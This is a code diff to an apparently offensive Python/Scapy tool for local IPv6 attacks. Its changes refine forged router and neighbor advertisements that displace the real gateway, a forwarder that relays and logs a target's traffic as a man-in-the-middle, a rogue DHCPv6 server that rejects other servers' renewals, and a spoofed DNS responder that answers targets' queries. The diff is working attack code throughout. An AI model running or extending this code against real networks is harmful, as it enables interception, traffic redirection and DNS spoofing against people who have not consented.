@@ -20,20 +20,19 @@ vPorts = []
 
 dhcpM = DHCPv6_am()
 
-def sendNA(source,destination,interface=conf.iface):
-    p = (IPv6(src=source,dst=destination)/ICMPv6ND_NA(tgt=destination,R=1,S=1,O=1)/ ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr(iff=interface)))
-    p.show()
-    send(p,iface=interface)
+def sendNA(source,destination,interface=conf.iface,S=1):
+    p = (IPv6(src=source,dst=destination)/ICMPv6ND_NA(tgt=destination,R=1,S=S,O=0)/ ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr(iff=interface)))
+    send(p,iface=interface,verbose=0)
 
-def sendRA(interface,gw):
+def sendRA(target,port,interface,gw):
     while True:
-        send(IPv6(src=gw,dst=targets[1].linklocal)/ICMPv6ND_RA(routerlifetime=0),iface=interface,verbose=0)
-        send(IPv6(src=myDevice.linklocal, dst=targets[1].linklocal)/ICMPv6ND_RA(),iface=interface,verbose=0)
-        time.sleep(2)
+        send(IPv6(src=gw,dst=target.linklocal)/ICMPv6ND_RA(routerlifetime=0),iface=interface,verbose=0)
+        send(IPv6(src=port.linklocal, dst=target.linklocal)/ICMPv6ND_RA(),iface=interface,verbose=0)
+        time.sleep(5)
 
-def Revert(interface,gw):
-        send(IPv6(src=gw,dst=targets[1].linklocal)/ICMPv6ND_RA(),iface=interface,verbose=0)
-        send(IPv6(src=myDevice.linklocal, dst=targets[1].linklocal)/ICMPv6ND_RA(routerlifetime=0),iface=interface,verbose=0)
+def Revert(target,port,interface,gw):
+        send(IPv6(src=gw,dst=target.linklocal)/ICMPv6ND_RA(),iface=interface,verbose=0)
+        send(IPv6(src=port.linklocal, dst=target.linklocal)/ICMPv6ND_RA(routerlifetime=0),iface=interface,verbose=0)
 
 def clearRouter(target,gw):
     send(IPv6(src=gw,dst=target)/ICMPv6ND_RA(routerlifetime=0))
@@ -43,29 +42,36 @@ def Redirect(target,gw,interface):
     send(p,iface=interface, loop=1, inter=0.1,verbose=0)
 
 def get_target_mac(target,interface):
-    print(myDevice.linklocal)
-    r = srp1(IPv6(src=myDevice.linklocal,dst=target)/ICMPv6ND_NS(tgt=target),iface=interface,verbose=0)
+    r = srp1(Ether()/IPv6(src=myDevice.linklocal,dst=target)/ICMPv6ND_NS(tgt=target),iface=interface,verbose=0)
+    print(r.show())
     return r.getlayer(Ether).src
 
-def forwarder(vPort):
-    target = vPort.targetDevice
-    sniff(filter="ip6 && inbound",prn=forward(target))
+def forwarder(port):
+    target = port.targetDevice
+    print(f"target is {target.macaddr} -- {target.linklocal} -- {target.globalip}")
+    sniff(filter="ip6 && inbound",prn=forward(target,port))
 
-def forward(target):
+def forward(target,port):
     def forw(packet):
-        if packet.getlayer(Ether).src == target.macaddr or packet.getlayer(IPv6).src == target.linklocal or packet.getlayer(IPv6).src == target.globalip:
-            packet.getlayer(Ether).src = vPort.macaddr
-            packet.getlayer(Ether).dst = gatewayDev.macaddr
-            packet.getlayer(IPv6).src = vPort.linklocal
-            sendp(packet,iface=conf.iface,verbose=0)
-            vPort.Write(packet)
+        if packet.getlayer(IPv6).src == target.linklocal and ICMPv6ND_NS in packet and packet.getlayer(ICMPv6ND_NS).tgt == port.linklocal:
+            print("!!!")
+            sendNA(port.linklocal,target.linklocal,S=1)
 
-        if packet.getlayer(Ether).dst == vPort.macaddr or packet.getlayer(IPv6).dst == vPort.linklocal:
-            packet.getlayer(Ether).src = vPort.macaddr
+        elif packet.getlayer(Ether).src == target.macaddr or packet.getlayer(IPv6).src == target.linklocal or packet.getlayer(IPv6).src == target.globalip:
+            print(packet.summary())
+            port.Write(packet)
+            packet.getlayer(Ether).src = port.macaddr
+            packet.getlayer(Ether).dst = gatewayDev.macaddr
+            packet.getlayer(IPv6).src = port.linklocal
+            sendp(packet,iface=conf.iface,verbose=0)
+
+        elif packet.getlayer(Ether).dst == port.macaddr or packet.getlayer(IPv6).dst == port.linklocal:
+            print(packet.summary())
+            port.Write(packet)
+            packet.getlayer(Ether).src = port.macaddr
             packet.getlayer(Ether).dst = gatewayDev.macaddr
             packet.getlayer(IPv6).dst = gatewayDev.linklocal
             sendp(packet,iface=conf.iface,verbose=0)
-            vPort.Write(packet)
     return forw
 
 def DHCPadvertise(interface,targets = ['ff02::1']):
@@ -161,47 +167,44 @@ def getLLMNRResponse(trID):
 
 
 def getReverseDNS(targetIp):
-    revIP = ""
     parts = str(targetIp).split(":")
     while len(parts) <= 8:
-        for x in range(len(parts)):
-            if parts[x] == "":
-                parts.insert(x,"0000")
-                break
-    try:
-        parts.remove("")
-    except:
-        pass
-
-    print(parts)
-
-    for x in range(len(parts)):
-        while len(parts[x]) < 4:
-            parts[x] = "0" + parts[x]
-        revIP += parts[x]
-    revIP = revIP[::-1]
-    revIP = [*revIP]
-    for x in range(len(revIP)*2):
-        if x % 2 == 0:
-            revIP.insert(x+1,".")
-    revIP = ''.join(str(x) for x in revIP)
-    return(revIP + "ip6.arpa")
+        parts.insert(parts.index(''), "0000")
+    parts = [part.zfill(4) for part in parts if part != '']
+    revIP = ''.join(reversed(''.join(parts)))
+    revIP = '.'.join(revIP[i:i+1] for i in range(0, len(revIP), 1))
+    return revIP + ".ip6.arpa"
 
 def DHCPanswer(dns,networkAddress,prefix,interface):
-
     network = ipaddress.ip_network(f"{networkAddress}/{prefix}")
     firstaddress = network.network_address + 1
     lastaddress = network.broadcast_address - 1
 
     dhcpM = dhcpAM.DHCPv6_am(dns=dns, startip=firstaddress, endip=lastaddress, iface=interface)
 
-    while True:
-        p = sniff(filter=dhcpM.filter,count=1)
-        p.show()
-        if source_in_targets(targets,p[0].getlayer(IPv6).src) and dhcpM.is_request(p[0]):
-            r = dhcpM.make_reply(p[0])
-            r.show()
-            send(r,iface=interface)
+    p = sniff(filter=dhcpM.filter,prn=getDhcpAnswer(dhcpM))
+    print("Done")
+
+def getDhcpAnswer(dhcpM):
+    def dhcpAns(packet):
+        print(f"1:{packet.summary()}")
+        if source_in_targets(targets,packet[IPv6].src):
+            if dhcpM.is_request(packet):
+                print(f"2:{packet.summary()}")
+                r = dhcpM.make_reply(packet)
+                r.show()
+                if Ether not in r:
+                    r = Ether(dst=packet.getlayer(Ether).src)/r
+                sendp(r,iface=conf.iface)
+            elif DHCP6_Renew in packet and packet[DHCP6OptServerId].duid != dhcpM.duid:
+                p = IPv6(dst=packet[IPv6].src)/DHCP6_Reply(trid=packet.trid)/DHCP6OptStatusCode(statuscode=DHCPV6_STATUS_NOBINDING)
+                options_to_check = [DHCP6OptServerId, DHCP6OptClientId]
+                for option in options_to_check:
+                    if option in packet:
+                        p /= packet[option]
+                sendp(p,iface=conf.iface)
+                
+    return dhcpAns
 
 def processTargetsFile(targetsfile,interface):
     if not os.path.exists(targetsfile):
@@ -211,7 +214,6 @@ def processTargetsFile(targetsfile,interface):
         lines = [line.rstrip() for line in file]
         for l in lines:
             if matchIPv6(l) and regex.match("^fe80:.+",l):
-                print(l)
                 dev = Device(l,"",get_target_mac(l,interface))
                 targets.append(dev)
 
@@ -243,13 +245,21 @@ def DNSanswer(interface,joker,dnsfile):
 
     dnsM = DNS_am(iface=interface,joker6=joker,match=processDndFile(dnsfile))
 
-    while True:
-        p = sniff(filter=f"{dnsM.filter} && ip6 && inbound",count=1)
-        #source_in_targets(targets,p[0].getlayer(IPv6).src) and
-        if dnsM.is_request(p[0]):
-            r = dnsM.make_reply(p[0])
-            #r.show()
+    os.system("sudo ip6tables -I OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")
+
+    p = sniff(filter=f"ip6 && inbound",prn=dnsAnswer(dnsM))
+
+
+def dnsAnswer(dnsM):
+    def dnsA(packet):
+        print(packet.summary())
+        if source_in_targets(targets,packet[IPv6].src) and DNSQR in packet:
+            r = dnsM.make_reply(packet)
+            if Ether not in r:
+                r = Ether(dst=packet.getlayer(Ether).src)/r
+            r.show()
             send(r,iface=interface)
+    return dnsA
 
 
 @click.group
@@ -299,26 +309,27 @@ def gateway(target,targetsfile,gateway,interface,p):
     except:
         pass
 
-    threading.Thread(target=sendRA,daemon=True,args=(interface,gateway)).start()
-
     for t in targets:
         mac = get_random_mac()
-        d = vPort(linklocal=linklocalFromMAC(mac),macaddr=mac,write=p)
-        d.AddTarget(t)
+        d = vPort(linklocal=linklocalFromMAC(mac),macaddr=mac)
+        d.AddTarget(t,write=p)
         vPorts.append(d)
-        threading.Thread(target=forwarder,daemon=True, args=(d)).start()
+        sendNA(d.linklocal,t.linklocal,S=0)
+        threading.Thread(target=sendRA,daemon=True,args=(t,d,interface,gateway)).start()
+        threading.Thread(target=forwarder,daemon=True, args=(d,)).start()
 
     input()
-    Revert(interface=interface,gw=gateway)
+    for p in vPorts:
+        Revert(p.targetDevice,p,interface=interface,gw=gateway)
     print("Quitting")
 
 @click.command()
 @click.option("-i","--interface", prompt="Ineterface for the network", help="Interface you want to connect to")
-@click.option("-T","--TargetsFile", help="Filepath to list of targets to give addresses",type=click.Path())
+@click.option("-T","--targetsFile", help="Filepath to list of targets to give addresses",type=click.Path())
 @click.option("-n", "--networkAddress", help="First avalible address",default="2001:db9::1")
-@click.option("-prefix", "--prefix", help="Last avalible address",default="2001:db9::ffff:ffff:ffff:ffff")
+@click.option("-p", "--prefix", help="Last avalible address",default="2001:db9::ffff:ffff:ffff:ffff")
 @click.option("-dns", help="Address of DNS server",default="2001:500::1035")
-def dhcp(interface,targetsfile,networkAddress,prefix,dns):
+def dhcp(interface,targetsfile,networkaddress,prefix,dns):
     conf.iface = interface
     myDevice.linklocal = get_linklocal(interface=conf.iface)
     myDevice.globalip = get_global(interface)
@@ -327,7 +338,7 @@ def dhcp(interface,targetsfile,networkAddress,prefix,dns):
     processTargetsFile(targetsfile,interface)
 
     threading.Thread(target=DHCPadvertise,daemon=True,args=(interface,targets)).start()
-    threading.Thread(target=DHCPanswer,daemon=True,args=(dns,networkAddress,prefix,interface)).start()
+    threading.Thread(target=DHCPanswer,daemon=True,args=(dns,networkaddress,prefix,interface)).start()
 
     input()
     print("Quitting")
@@ -372,13 +383,9 @@ def helper(target):
     #dev = Device(linklocal=target)
     #get_target_global(dev)
     print(conf.iface)
-    p=IPv6(src="fe80::69",dst="fe80::96")/ICMPv6ND_NA(tgt="fe80::96",R=1,S=1,O=1)
+    p=(IPv6(dst=target)/ICMPv6EchoRequest())
     print(p.show())
-    sendp(p,iface=conf.iface)
-
-
-def asd(pkt):
-    return 0
+    send(p,iface=conf.iface)
 
 mode_commands.add_command(helper)
 mode_commands.add_command(gateway)
@@ -387,3 +394,4 @@ mode_commands.add_command(dns)
 
 if __name__ == "__main__":
      mode_commands()
+print
